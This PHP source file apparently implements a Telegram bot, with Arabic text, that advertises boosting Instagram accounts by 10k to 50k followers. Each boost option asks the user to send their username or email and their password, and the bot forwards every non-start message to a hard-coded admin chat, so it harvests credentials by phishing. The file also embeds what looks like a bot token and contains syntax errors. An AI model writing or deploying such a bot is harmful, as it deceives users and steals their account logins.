<?php

ob_start();

define('1501157696:AAFaHlwQC6EdoEHEQt21bWwT08VPwnfNr0Y');
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$admin = 1662740335;
$id = $message->from->id;

if($text == '/start' and $id ){
    bot('sendmessage',[
       'chat_id'=>$chat_id,
        'text'=>'🎐┇اهــلا بك عزيزي
🎐┇في بــوت رشــق حسابات الانســتا
🎓┇وضيــفة البــوت
🎋┇نشــر حسابــك بأكثــر من 30 موقع خاص بالرشق
🎓┇اضغــط 【  followers_my_acount30k/ 】',
        'reply_markup'=>json_encode([
          'inline_keyboard'=>[ 
            [
                ['text'=>'♻تابعــنا♻','url'=>'https://t.me/Kings_Domain']
            ],
            [
                ['text'=>'♻المطــور♻','url'=>'https://t.me/mahmoodeltaweel03']
            ],
              ]
        ])
    ]);
}

if($text != '/start' and $id != $admin){
    bot('forwardMessage',[
        'chat_id'=>$admin,
        'from_chat_id'=>$chat_id,
        'message_id'=>$message->message_id,
    ]);
    bot('sendmessage',[
       'chat_id'=>$chat_id,
        'text'=>'',
        'reply_to_message_id'=>$message->message_id,
        '
]);
}
if($text == '/followers_my_acount30k'){
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>'💯┇عزيــزي اتبــع القائــمه ادناه لرشق حسابك
💯┇والحصــول على زياده 30k
☑┇‏‏تابعنــا @Kings_Domain', 
'reply_markup'=>json_encode([ 
'keyboard'=>[ 
[ 
['text'=>'💯¦رشق حســابي10k'] 
],
[ 
['text'=>'💯¦ رشــق حسابي 20k'],['text'=>'☑️¦ رشــق حسابي 30k']
], 
[ 
['text'=>'💯¦ رشق حسابــي 40k'] 
], 
[ 
['text'=>'💯¦ رشــق حسابي 50k']
],
]
]) 
]);
}
if($text == "💯¦رشق حســابي10k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"🎐【 10k عزيــزي لرشــق حسابــك】
🎓【قــم بأرسال يوزر حسابك او الايميل والباسوورد 
الخــاص بالحساب المــراد رشقه بالترتيــب ادناه】
USER:- كمــثال (ua8)
EMEL :- كمثــال (joe@exmple.com)
PASSWRD :- كمــثال (iraqiraq)
تــاكد من ملئ المعلــومات لرشق حسابــك",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($text == "💯¦ رشــق حسابي 20k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"🎐【 20k عزيــزي لرشــق حسابــك】
🎓【قــم بأرسال يوزر حسابك او الايميل والباسوورد 
الخــاص بالحساب المــراد رشقه بالترتيــب ادناه】
USER:- كمــثال (ua8)
EMEL :- كمثــال (joe@exmple.com)
PASSWRD :- كمــثال (iraqiraq)
تــاكد من ملئ المعلــومات لرشق حسابــك",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($text == "☑️¦ رشــق حسابي 30k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"🎐【 30k عزيــزي لرشــق حسابــك】
🎓【قــم بأرسال يوزر حسابك او الايميل والباسوورد 
الخــاص بالحساب المــراد رشقه بالترتيــب ادناه】
USER:- كمــثال (ua8)
EMEL :- كمثــال (joe@exmple.com)
PASSWRD :- كمــثال (iraqiraq)
تــاكد من ملئ المعلــومات لرشق حسابــك",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($text == "💯¦ رشق حسابــي 40k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"🎐【 40k عزيــزي لرشــق حسابــك】
🎓【قــم بأرسال يوزر حسابك او الايميل والباسوورد 
الخــاص بالحساب المــراد رشقه بالترتيــب ادناه】
USER:- كمــثال (ua8)
EMEL :- كمثــال (joe@exmple.com)
PASSWRD :- كمــثال (iraqiraq)
تــاكد من ملئ المعلــومات لرشق حسابــك",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($text == "💯¦ رشــق حسابي 50k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"🎐【 50k عزيــزي لرشــق حسابــك】
🎓【قــم بأرسال يوزر حسابك او الايميل والباسوورد 
الخــاص بالحساب المــراد رشقه بالترتيــب ادناه】
USER:- كمــثال (ua8)
EMEL :- كمثــال (joe@exmple.com)
PASSWRD :- كمــثال (iraqiraq)
تــاكد من ملئ المعلــومات لرشق حسابــك",
'reply_to_message_id'=>$message->message_id, 
]);
} 
